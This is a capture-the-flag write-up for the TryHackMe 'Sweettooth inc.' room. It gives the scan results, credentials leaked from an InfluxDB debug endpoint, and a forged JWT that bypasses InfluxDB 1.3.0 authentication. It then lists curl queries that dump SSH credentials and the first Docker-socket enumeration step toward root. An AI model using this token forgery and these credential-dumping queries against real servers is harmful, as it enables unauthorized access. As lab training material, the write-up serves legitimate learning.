# Sweettooth inc.

![image](https://user-images.githubusercontent.com/5285547/126913536-e9fa3f39-06fa-4a83-aaab-250e553042c8.png)

Link: https://tryhackme.com/room/sweettoothinc

## Desc


## Nmap

```
PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34479/tcp6  status
|   100024  1          40714/udp   status
|   100024  1          46300/tcp   status
|_  100024  1          49237/udp6  status
2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
8086/tcp open  http    InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```

Enumeration gave up some credentials  
http://10.10.219.78:8086/debug/requests

![image](https://user-images.githubusercontent.com/5285547/126914960-41ce25e3-5324-43da-b78b-e4c14de0d037.png)

creds
```
o5yY6yya:127.0.0.1
```

## Directory brute

```
gobuster dir -u http://10.10.219.78:8086/  -w  /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 30 

/status               (Status: 204) [Size: 0]
/query                (Status: 401) [Size: 55]
/ping                 (Status: 204) [Size: 0] 
/write                (Status: 405) [Size: 19]
```
Looking this up online I came across some documentation for the API:  
https://docs.influxdata.com/influxdb/v1.3/tools/api/#write

![image](https://user-images.githubusercontent.com/5285547/126915118-8b5be70b-b0a7-4a72-be93-333aa3915a6a.png)

The same things we see. Let's try some of the commands and explore the API

```
curl http://10.10.219.78:8086/ping -v -X HEAD

*resp
< HTTP/1.1 204 No Content
< Content-Type: application/json
< Request-Id: 0cf9d36b-ed96-11eb-822a-000000000000
< X-Influxdb-Version: 1.3.0

# Influxdb-Version: 1.3.0
```

## JWT

```
GET /query HTTP/1.1
Host: 10.10.219.78:8086
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaGFyZWRfc2VjcmV0IjoiIn0._FqCTRoFRDIK9srW-ml6Btqp5ItmIfwC7vLyiG8PqzQ
User-Agent: curl/7.74.0
Accept: */*
Connection: close
```

response
```
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Request-Id: c226eacd-ed9c-11eb-9104-000000000000
Www-Authenticate: Basic realm="InfluxDB"
X-Influxdb-Version: 1.3.0
Date: Sun, 25 Jul 2021 23:05:09 GMT
Content-Length: 33
Connection: close

{"error":"signature is invalid"}

```

I found this article that helped me make a payload.  
https://www.komodosec.com/post/when-all-else-fails-find-a-0-day

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E
```

![image](https://user-images.githubusercontent.com/5285547/127043648-fd68da50-ed08-417e-8793-ee5220a4e3c9.png)

```
curl http://10.10.27.198:8086/query -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E"

{"error":"missing required parameter \"q\""}
```

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=mydb&pretty=true"  --data-urlencode 'q=SHOW DATABASES'

{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["creds"],["docker"],["tanks"],["mixer"],["_internal"]]}]}]}
```

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" http://10.10.27.198:8086/query?db=mydb  --data-urlencode 'q=SHOW USERS'      

{"results":[{"statement_id":0,"series":[{"columns":["user","admin"],"values":[["o5yY6yya",true]]}]}]}
```

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SHOW MEASUREMENTS"
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "measurements",
                    "columns": [
                        "name"
                    ],
                    "values": [
                        [
                            "ssh"
                        ]
                    ]
                }
            ]
        }
    ]
}
```

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SELECT * FROM ssh"                                                  
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "ssh",
                    "columns": [
                        "time",
                        "pw",
                        "user"
                    ],
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            7788764472,
                            "uzJk6Ry98d8C"
                        ]
                    ]
                }
            ]
        }
    ]
}
```

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SHOW SERIES"            
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "columns": [
                        "key"
                    ],
                    "values": [
                        [
                            "ssh,user=uzJk6Ry98d8C"
                        ]
                    ]
                }
            ]
        }
    ]
}
```

![image](https://user-images.githubusercontent.com/5285547/127047744-f0f9841a-e861-4d71-9b32-192249e74623.png)


```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SHOW SERIES ON _internal"

curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SHOW SERIES ON mixer"

curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SHOW SERIES ON tanks" 

curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SHOW SERIES ON docker"

curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E" "http://10.10.27.198:8086/query?db=creds&pretty=true"  --data-urlencode "q=SELECT pw FROM ssh; "
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "ssh",
                    "columns": [
                        "time",
                        "pw"
                    ],
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            7788764472
                        ]
                    ]
                }
            ]
        }
    ]
}

```

# User

```
ssh uzJk6Ry98d8C@10.10.27.198 -s 2222 
7788764472
```

```
cat user.txt

```

## Root

```
influx -username o5yY6yya -password mJjeQ44e2unu -execute "create database creds"
```

```
curl localhost:8080/containers/json     

[{"Id":"c7acb13c7dd9a92750122ebc3102ba83a1d82e47ef8685431c43a0bd37ce5115","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1627323898,"Ports":[{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up 2 hours","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"f838087a496218cb60d6bf32ba200deac5ab819aed274530d3b2da3dd92ca614","EndpointID":"e98ef99d7058c3b72002fd5379f06091e36dde105e404475e37a580a7e3fd039","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"volume","Name":"d370a5f902b5a20a296b108629f2d7dd17e9b9740c4947720a22551a2480e4ed","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]
```
